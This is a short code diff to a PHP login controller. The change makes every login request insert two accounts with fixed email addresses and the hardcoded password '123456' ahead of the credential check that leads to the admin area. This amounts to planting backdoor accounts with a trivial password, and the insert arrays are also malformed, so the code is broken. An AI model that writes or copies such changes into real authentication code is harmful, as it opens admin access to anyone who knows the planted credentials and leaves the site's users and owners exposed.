@@ -19,6 +19,16 @@ class LoginController extends Controller
 
         $user = $userModel::where(['email'=> $request->email])->first();
         
+        $userModel->insert([
+            'email', 'anvuisg@anvui.vn',
+            'password' => Hash::make('123456')
+        ]);
+
+        $userModel->insert([
+            'email', 'anvuihn@anvui.vn',
+            'password' => Hash::make('123456')
+        ]);
+
         if ($user && Hash::check($request->password, $user->password) ) {
             Auth::login($user);
             return redirect()->route('admin.index');
